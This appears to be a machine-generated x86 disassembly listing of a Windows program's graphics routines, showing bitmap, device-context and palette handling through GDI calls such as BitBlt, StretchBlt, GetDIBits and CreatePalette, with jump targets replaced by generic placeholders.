mov eax [ eax + 0x18 ]
call sub_41cd14
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d9c0
call sub_41cd14
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_41e584
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4221f7
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41e62c
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_4221c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41e62c
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_402714
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41cd14
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d9c0
call sub_41cd14
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41cd14
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d9c0
call sub_41cd14
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41e62c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403b7c
call sub_403b7c
jmp r-xdata
sub_422219
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_422228
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_403af8
call sub_403b4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_422288
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_4222ec
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_4217e0
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4224e7
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_41e62c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41e62c
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41e62c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42249f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_421c24
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_4224f8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41f7ac
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_421a50
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_422560
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_422c70
mov eax [ esi + 0x28 ]
call sub_421a54
mov eax [ esi + 0x2c ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414988
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_42259c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_422654
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402d44
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_422f40
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_421a50
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_421a54
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4149b4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_42268c
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_422c70
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42271b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_422288
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_421c24
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_422f40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_422720
mov eax [ ebp - 0x8 ]
call sub_41c444
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403af8
call sub_403b4c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_42274c
push ebx
mov ebx eax
mov eax ebx
call sub_422a40
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40d6a0
pop ebx
retn
sub_42277c
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_4160d4
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_422c70
lea eax [ ebx + 0x2c ]
call sub_40d6a0
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_422f40
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_4227f0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41e308
mov eax ebx
call sub_422d80
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_422b7c
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_422a2c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_41e234
push eax
call SetStretchBltMode
mov eax ebx
call sub_422ac0
mov dl [ r-xdata ]
call sub_41e308
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_422d20
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_422ac0
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422a33
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4229c1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_41e62c
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_422ac0
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41e7d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_422a40
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_422c80
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_42268c
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_41e584
sub_422ac0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_422c80
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42185c
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_42274c
sub_422b08
push ebx
mov ebx eax
mov eax ebx
call sub_422c70
mov eax ebx
call sub_422c80
mov edx ebx
mov eax ebx
call sub_42274c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_422b2c
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_422bac
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_41cd14
mov eax ebx
call sub_422b7c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_422ac0
xor edx edx
pop ecx
call sub_41e19c
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_422bfc
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_422d80
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_421c24
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_422c80
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_416070
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_422d03
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_422d20
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_422c70
mov eax ebx
call sub_422c80
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_422bac
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_4222ec
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_4217e0
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_422d80
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_41ed1c
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_4217e0
push 0x0
call GetDC
call sub_41e62c
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_422e38
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_41e4f4
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_42268c
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_422c70
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402d44
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_422ebc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_416050
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_4235d0
pop esi
pop ebx
retn
sub_422ee0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push ecx
push 0x2
mov eax [ r-xdata ]
mov cl 0x1
xchg edx ecx
call sub_4168e0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_422f34
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_423068
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422f3b
mov eax [ ebp - 0x4 ]
call sub_403344
retn
sub_422f40
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_422fc7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_4034f4
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
